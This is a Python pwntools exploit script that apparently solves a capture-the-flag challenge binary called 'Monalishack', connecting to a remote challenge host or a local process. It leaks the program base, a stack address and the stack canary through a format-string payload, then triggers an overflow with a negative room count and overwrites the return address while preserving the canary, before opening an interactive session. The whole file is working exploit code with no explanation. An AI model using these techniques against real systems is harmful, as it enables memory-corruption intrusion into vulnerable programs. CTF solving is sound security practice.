from pwn import *
from pwnlib import timeout

context.log_level = "debug"
# context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./Monalishack"
elf = ELF(vuln_path)

def get_io():
    if f_gdb:
        io = process(vuln_path, stdin=PTY, stdout=PTY) if not f_remote else remote("a78ff51eded4ce7be39eac9aa1094ff2.chall.dvc.tf", 443, ssl=True)
    else:
        io = process(vuln_path) if not f_remote else remote("a78ff51eded4ce7be39eac9aa1094ff2.chall.dvc.tf", 443, ssl=True)
    return io


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

def pwn(io):
    payload="%9$p-%18$p-%19$p-"
    d = ""
    d += "breakrva 0x124D\n "
    d += "breakrva 0x1388\n"
    d += "continue"
    # ddebug(d)
    io.sendlineafter("Enter your name :", payload)
    
    io.sendlineafter("choice", "3")
    io.sendlineafter("How many rooms do you want to visit? ( 0-99 )", "1")
    io.sendlineafter("choice", "1")
    
    leak = io.recvuntil("-")
    app = int(leak[-15:-1], 16) - 0x16fb
    log.success("app:-----> " + hex(app))
    leak = io.recvuntil("-")
    stack = int(leak[-15:-1], 16)
    log.success("stack:-----> " + hex(stack))
    leak = io.recvuntil("-")
    canary = int(leak[-19:-1], 16)
    log.success("canary:-----> " + hex(canary))
    io.sendlineafter("choice", "3")
    io.sendlineafter("How many rooms do you want to visit? ( 0-99 )", "-1")
    
    payload = b""
    payload += b"t"*10
    payload += p64(canary)
    payload += p64(stack)
    payload += p64(app + 0x129a)

    io.sendlineafter("Who are the tickets for?", payload)
    io.recv(timeout=1)
    sleep(1) 
    io.interactive()
if f_gdb:

    io = get_io()
    pwn(io)
else:
    for i in range(20):
        io = get_io()
        log.success(f"------{i}-------")
        try:
            pwn(io)
        except:
            pass
        finally:
            io.close()
